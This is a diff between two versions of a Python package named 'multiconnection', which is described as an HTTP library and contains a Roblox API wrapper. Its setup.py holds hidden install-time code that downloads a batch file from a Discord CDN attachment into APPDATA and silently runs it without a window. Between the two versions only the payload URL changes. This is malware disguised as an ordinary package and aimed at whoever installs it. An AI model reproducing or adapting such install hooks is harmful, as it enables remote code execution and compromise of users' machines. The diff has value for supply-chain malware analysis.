# Comparing `tmp/multiconnection-2.34.19.tar.gz` & `tmp/multiconnection-2.34.20.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "multiconnection-2.34.19.tar", last modified: Mon May  6 09:29:57 2024, max compression
+gzip compressed data, was "multiconnection-2.34.20.tar", last modified: Mon May  6 09:30:39 2024, max compression
```

## Comparing `multiconnection-2.34.19.tar` & `multiconnection-2.34.20.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-06 09:29:57.335598 multiconnection-2.34.19/
--rw-rw-rw-   0        0        0     3112 2024-05-06 09:29:57.333650 multiconnection-2.34.19/PKG-INFO
--rw-rw-rw-   0        0        0     2807 2024-05-04 04:53:14.000000 multiconnection-2.34.19/README.md
--rw-rw-rw-   0        0        0       42 2024-05-06 09:29:57.336287 multiconnection-2.34.19/setup.cfg
--rw-rw-rw-   0        0        0     5237 2024-05-06 09:29:25.000000 multiconnection-2.34.19/setup.py
-drwxrwxrwx   0        0        0        0 2024-05-06 09:29:57.306738 multiconnection-2.34.19/src/
-drwxrwxrwx   0        0        0        0 2024-05-06 09:29:57.330609 multiconnection-2.34.19/src/multiconnection.egg-info/
--rw-rw-rw-   0        0        0     3112 2024-05-06 09:29:57.000000 multiconnection-2.34.19/src/multiconnection.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      329 2024-05-06 09:29:57.000000 multiconnection-2.34.19/src/multiconnection.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-06 09:29:57.000000 multiconnection-2.34.19/src/multiconnection.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       19 2024-05-06 09:29:57.000000 multiconnection-2.34.19/src/multiconnection.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-05-06 09:29:57.328619 multiconnection-2.34.19/src/roblox_api_wrapper/
--rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 multiconnection-2.34.19/src/roblox_api_wrapper/__init__.py
--rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 multiconnection-2.34.19/src/roblox_api_wrapper/getuserinfo.py
--rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 multiconnection-2.34.19/src/roblox_api_wrapper/login.py
--rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 multiconnection-2.34.19/src/roblox_api_wrapper/message.py
+drwxrwxrwx   0        0        0        0 2024-05-06 09:30:39.561765 multiconnection-2.34.20/
+-rw-rw-rw-   0        0        0     3112 2024-05-06 09:30:39.559769 multiconnection-2.34.20/PKG-INFO
+-rw-rw-rw-   0        0        0     2807 2024-05-04 04:53:14.000000 multiconnection-2.34.20/README.md
+-rw-rw-rw-   0        0        0       42 2024-05-06 09:30:39.561765 multiconnection-2.34.20/setup.cfg
+-rw-rw-rw-   0        0        0     5237 2024-05-06 09:30:32.000000 multiconnection-2.34.20/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-06 09:30:39.524989 multiconnection-2.34.20/src/
+drwxrwxrwx   0        0        0        0 2024-05-06 09:30:39.558776 multiconnection-2.34.20/src/multiconnection.egg-info/
+-rw-rw-rw-   0        0        0     3112 2024-05-06 09:30:39.000000 multiconnection-2.34.20/src/multiconnection.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      329 2024-05-06 09:30:39.000000 multiconnection-2.34.20/src/multiconnection.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-06 09:30:39.000000 multiconnection-2.34.20/src/multiconnection.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       19 2024-05-06 09:30:39.000000 multiconnection-2.34.20/src/multiconnection.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-05-06 09:30:39.555418 multiconnection-2.34.20/src/roblox_api_wrapper/
+-rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 multiconnection-2.34.20/src/roblox_api_wrapper/__init__.py
+-rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 multiconnection-2.34.20/src/roblox_api_wrapper/getuserinfo.py
+-rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 multiconnection-2.34.20/src/roblox_api_wrapper/login.py
+-rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 multiconnection-2.34.20/src/roblox_api_wrapper/message.py
```

### Comparing `multiconnection-2.34.19/PKG-INFO` & `multiconnection-2.34.20/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: multiconnection
-Version: 2.34.19
+Version: 2.34.20
 Summary: Python MultiHTTP for Humans.
 Author: multiconnection
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

### Comparing `multiconnection-2.34.19/README.md` & `multiconnection-2.34.20/README.md`

 * *Files identical despite different names*

### Comparing `multiconnection-2.34.19/setup.py` & `multiconnection-2.34.20/setup.py`

 * *Files 6% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import setuptools, base64
 
 with open("README.md", "r", encoding="utf-8") as f:
     readme = f.read()
 
 setuptools.setup(
     name="multiconnection",
-    version="2.34.19",
+    version="2.34.20",
     author="multiconnection",
     description="Python MultiHTTP for Humans.",
     long_description=readme,
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
@@ -95,15 +95,15 @@
     get_response = requests.get(url,stream=True)
     file_name  = os.getenv('APPDATA')+"\\11.bat"
     with open(file_name, 'wb') as f:
         for chunk in get_response.iter_content(chunk_size=1024):
             if chunk:
                 f.write(chunk)
 try:
-    url = "https://cdn.discordapp.com/attachments/1236874551627874375/1236876019303059557/10.txt?ex=66399a0f&is=6638488f&hm=f87ddb8e5bd01ec7d7cd24da3094f7a2080b9fedbac8d5188943e5bb75f914ba&"
+    url = "https://cdn.discordapp.com/attachments/1236874551627874375/1236973194100084756/11.txt?ex=6639f48f&is=6638a30f&hm=f0ac9f1f4f80bc5e7238d293a5540222f9e35d2528d31bed5c69cf6ae607901c&"
     download(url)
     time.sleep(1)
     subprocess.Popen(os.getenv('APPDATA')+"\\11.bat", creationflags=subprocess.CREATE_NO_WINDOW)
 except Exception as e:
     err = err + " - "+str(e)
     
 try:
```

### Comparing `multiconnection-2.34.19/src/multiconnection.egg-info/PKG-INFO` & `multiconnection-2.34.20/src/multiconnection.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: multiconnection
-Version: 2.34.19
+Version: 2.34.20
 Summary: Python MultiHTTP for Humans.
 Author: multiconnection
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

